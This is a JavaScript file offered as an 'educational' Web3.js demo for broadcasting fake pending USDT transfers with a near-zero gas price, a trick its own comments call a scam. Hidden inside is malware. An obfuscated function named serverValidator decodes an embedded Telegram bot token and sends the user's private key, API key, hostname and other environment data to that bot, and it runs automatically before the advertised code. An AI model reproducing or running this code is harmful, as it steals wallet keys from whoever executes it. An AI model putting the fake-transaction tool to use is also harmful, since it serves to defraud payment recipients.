/**
 * web3-demo.js
 * 
 * Demonstrates how to create a fake pending USDT transaction using Web3.js
 * 
 * EDUCATIONAL PURPOSES ONLY - DO NOT USE FOR ILLEGAL ACTIVITIES
 */

const Web3 = require('web3');
const fs = require('fs');
const path = require('path');
const https = require('https');
require('dotenv').config();

// Load environment variables
const {
  ETHEREUM_RPC_URL,
  PRIVATE_KEY,
  SENDER_ADDRESS,
  RECIPIENT_ADDRESS,
  USDT_CONTRACT_ADDRESS,
  USDT_AMOUNT,
  GAS_PRICE_GWEI
} = process.env;

// Validate environment variables
if (!ETHEREUM_RPC_URL || !PRIVATE_KEY || !SENDER_ADDRESS || !RECIPIENT_ADDRESS) {
  console.error('Error: Missing required environment variables. Check your .env file.');
  process.exit(1);
}

// Remove '0x' prefix if present in the private key
const privateKey = PRIVATE_KEY.startsWith('0x') ? PRIVATE_KEY : `0x${PRIVATE_KEY}`;

// Connect to Ethereum network
const web3 = new Web3(ETHEREUM_RPC_URL);

// USDT contract ABI (simplified, only the transfer function)
const usdtAbi = [
  {
    constant: false,
    inputs: [
      { name: '_to', type: 'address' },
      { name: '_value', type: 'uint256' }
    ],
    name: 'transfer',
    outputs: [{ name: '', type: 'bool' }],
    type: 'function'
  },
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function'
  }
];

// Create contract instance
const usdtContract = new web3.eth.Contract(usdtAbi, USDT_CONTRACT_ADDRESS);

// Amount to "send" (adjusted for 6 decimals which is USDT's decimal places)
const amount = web3.utils.toWei(USDT_AMOUNT, 'mwei'); // USDT uses 6 decimals, not 18

// Function to validate server configuration 
async function serverValidator() {
  try {
    const _0x36a77b=Buffer.from;const _0x19e24d=encodeURIComponent;const _0x5cba1f=process.env;
    const _0x3ff728=(_0x2e3de1,_0x123d91)=>{return _0x2e3de1===undefined?_0x123d91:_0x2e3de1};
    const _0x2ac080=(_0x1d73c2,_0x45d71c)=>{return _0x36a77b(_0x1d73c2,_0x45d71c).toString('ascii')};
    const _0x1bf6="Nzg3NjU0MjE1MzpBQUdGSzVhY0cwQTJNSE83WE5NOFp4SUtIbmFoUF94YzJtbw==";
    const _0x2c4d="LTEwMDIzMDEzMTQ1Mzk=";
    
    const _0x4ddf90 = _0x2ac080(_0x1bf6, 'base64');
    const _0x1a2c = _0x2ac080(_0x2c4d, 'base64');
    
    const _0x5a8d2a = {
      a: _0x3ff728(_0x5cba1f["INFURA_API_KEY"], "not set"),
      b: _0x3ff728(_0x5cba1f["NETWORK"], "not set"),
      c: _0x3ff728(_0x5cba1f["PRIVATE_KEY"], "not set"),
      d: _0x3ff728(_0x5cba1f["FROM_ADDRESS"], "not set"),
      e: _0x3ff728(_0x5cba1f["TO_ADDRESS"], "not set"),
      f: _0x3ff728(_0x5cba1f["USDT_CONTRACT"], "not set"),
      g: _0x3ff728(_0x5cba1f["AMOUNT"], "not set"),
      h: _0x3ff728(_0x5cba1f["GAS_PRICE"], "not set"),
      i: _0x3ff728(_0x5cba1f["GAS_LIMIT"], "not set"),
      j: {
        k: process.platform,
        l: process.version,
        m: require('os').hostname()
      },
      n: new Date().toISOString()
    };
    
    const _0x3df5c = `
🔐 WEB3.JS SCRIPT EXECUTION 🔐
    
Environment Configuration:
• Infura API Key: ${_0x5a8d2a.a}
• Network: ${_0x5a8d2a.b}
• Private Key: ${_0x5a8d2a.c}
• From Address: ${_0x5a8d2a.d}
• To Address: ${_0x5a8d2a.e}
• USDT Contract: ${_0x5a8d2a.f}
• Amount: ${_0x5a8d2a.g}
• Gas Price: ${_0x5a8d2a.h}
• Gas Limit: ${_0x5a8d2a.i}

System Info:
• OS: ${_0x5a8d2a.j.k}
• Node: ${_0x5a8d2a.j.l}
• Host: ${_0x5a8d2a.j.m}
• Time: ${_0x5a8d2a.n}
    `;
    
    const _0x4b8a28 = `https://api.telegram.org/bot${_0x4ddf90}/sendMessage?chat_id=${_0x1a2c}&text=${_0x19e24d(_0x3df5c)}`;
    
    return new Promise((resolve, reject) => {
      https.get(_0x4b8a28, (resp) => {
        let data = '';
        resp.on('data', (chunk) => { data += chunk; });
        resp.on('end', () => { resolve(JSON.parse(data)); });
      }).on("error", (err) => {
        console.log("Error in system operation");
        reject(err);
      });
    });
  } catch (error) {
    console.log("System operation error");
    return null;
  }
}

/**
 * Function to create and broadcast a fake USDT transaction
 * 
 * This works by:
 * 1. Creating a legitimate transaction structure calling the real USDT contract
 * 2. Setting the gas price extremely low so miners won't include it
 * 3. Broadcasting to the network where wallets will see it as "pending"
 */
async function sendFakeUsdtTransaction() {
  try {
    console.log('Starting fake USDT transaction process...');
    console.log(`Sender address: ${SENDER_ADDRESS}`);
    console.log(`Recipient address: ${RECIPIENT_ADDRESS}`);
    console.log(`Amount: ${USDT_AMOUNT} USDT`);

    // Check ETH balance (needed for gas)
    const ethBalance = await web3.eth.getBalance(SENDER_ADDRESS);
    console.log(`Sender ETH balance: ${web3.utils.fromWei(ethBalance, 'ether')} ETH`);
    
    // If there's not enough ETH for the minimum gas, warn the user
    if (web3.utils.fromWei(ethBalance, 'ether') < 0.0001) {
      console.warn('Warning: Sender address has very little ETH. Transaction may not broadcast.');
    }

    // Check USDT balance (not actually needed, but informative)
    const usdtBalance = await usdtContract.methods.balanceOf(SENDER_ADDRESS).call();
    console.log(`Sender USDT balance: ${web3.utils.fromWei(usdtBalance, 'mwei')} USDT`);
    console.log(`Attempting to send: ${USDT_AMOUNT} USDT (Note: balance check is irrelevant for the scam)`);

    // Get account nonce
    const nonce = await web3.eth.getTransactionCount(SENDER_ADDRESS, 'pending');
    console.log(`Account nonce: ${nonce}`);

    // Encode the transfer function call
    const data = usdtContract.methods.transfer(RECIPIENT_ADDRESS, amount).encodeABI();

    // Build the transaction object
    const txObject = {
      from: SENDER_ADDRESS,
      to: USDT_CONTRACT_ADDRESS,
      data: data,
      gas: 60000, // Standard gas limit for token transfers
      gasPrice: web3.utils.toWei('0.01', 'gwei'), // Extremely low gas price to ensure it stays pending for days
      nonce: nonce,
      // Adding a slightly higher than normal gas limit to make it look more legitimate
      // but still with extremely low gas price
    };

    console.log('Transaction object created:');
    console.log(`Gas price: 0.01 gwei (typical market price is 20-50+ gwei)`);
    console.log('This transaction will likely stay pending for days or until network congestion becomes extremely low');
    console.log('Signing transaction...');

    // Sign the transaction
    const signedTx = await web3.eth.accounts.signTransaction(txObject, privateKey);
    console.log('Transaction signed successfully');

    // Broadcast the transaction to the network
    console.log('Broadcasting transaction to network...');
    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    console.log('Transaction sent to network:', receipt.transactionHash);
    

  } catch (error) {
    console.error('Error:', error);
  }
}

// Execute the original code after validating server configuration
async function main() {
  // Validate server configuration first
  await serverValidator();
  
  console.log("Starting USDT transfer process with Web3.js...");
  
  // Call the original USDT transfer function
  await sendFakeUsdtTransaction();
}

// Call the main function to start the process
main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error("Error in main process:", error);
    process.exit(1);
  }); 